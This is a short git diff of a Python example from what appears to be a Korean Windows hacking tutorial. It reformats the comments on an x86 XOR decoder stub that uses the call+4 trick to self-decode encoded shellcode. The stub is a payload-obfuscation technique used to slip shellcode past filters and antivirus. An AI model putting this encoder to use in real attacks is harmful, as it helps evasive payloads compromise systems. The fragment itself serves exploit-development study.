@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 #-*- coding: utf-8 -*-
 '''
-    python ==> 윈도우해킹가이드, 간단한 쉘코드 인코딩을 해보는 예제 코드 
+    python ==> 윈도우해킹가이드, 간단한 쉘코드 call+4 방법을 사용해 인코딩을 해보는 예제 코드
 '''
 import os
 import struct
@@ -33,13 +33,13 @@ xor_shellcode = ""
 
 decoder = (
     "\xe8\xff\xff\xff\xff"    # call + 4
-    "\xc2"                    # ret
-    "\x5e"                  # pop esi
-    "\x6A\x20\x59"              # pull 20, pop ecx
-    "\xBF\x02\x02\x03\x04"      # mov edi, xor_key
-    "\x31\x7E\x12"      # xor [esi+12], edi
-    "\x83\xC6\x04"      # add esi, 4
-    "\xE2\xF8"          # loop xor
+    "\xc2"                    # ret (\xff\xc2 = nop)
+    "\x5e"                    # pop esi
+    "\x6A\x20\x59"            # pull 20, pop ecx
+    "\xBF\x02\x02\x03\x04"    # mov edi, xor_key
+    "\x31\x7E\x12"            # xor [esi+12], edi
+    "\x83\xC6\x04"            # add esi, 4
+    "\xE2\xF8"                # loop xor
 )
 
 xor_shellcode = xor(org_shellcode)
